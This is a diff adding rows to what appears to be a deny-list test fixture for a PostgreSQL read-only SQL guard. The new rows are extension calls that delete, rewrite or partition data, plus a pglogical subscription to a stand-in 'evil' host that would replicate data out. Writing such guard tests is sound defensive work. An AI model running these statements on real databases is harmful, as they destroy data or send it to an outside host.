@@ -32,3 +32,12 @@ deny	SELECT cron.unschedule('nightly')	removing somebody else's job is a write t
 deny	SELECT cron.alter_job(1, schedule := '0 0 * * *')	.
 deny	SELECT CRON.SCHEDULE('a', 'b', 'c')	the schema match must not care about case
 deny	SELECT * FROM repack.repack_table('t')	pg_repack rewrites the table in place
+deny	SELECT drop_chunks('{{T2}}', older_than => now())	TimescaleDB installs into public, so a data-deleting call looks like any other
+deny	SELECT create_hypertable('{{T2}}', 'time')	.
+deny	SELECT compress_chunk('_hyper_1_1_chunk')	.
+deny	SELECT add_retention_policy('{{T2}}', INTERVAL '7 days')	a policy that deletes data on a schedule
+deny	SELECT AddGeometryColumn('{{T2}}', 'geom', 4326, 'POINT', 2)	PostGIS wrapper over ALTER TABLE
+deny	SELECT DropGeometryColumn('{{T2}}', 'geom')	.
+deny	SELECT partman.run_maintenance()	creates and drops partitions
+deny	SELECT pglogical.create_subscription('s', 'host=evil')	replication to somewhere else entirely
+deny	SELECT squeeze.squeeze_table('public', '{{T2}}')	rewrites the table in place
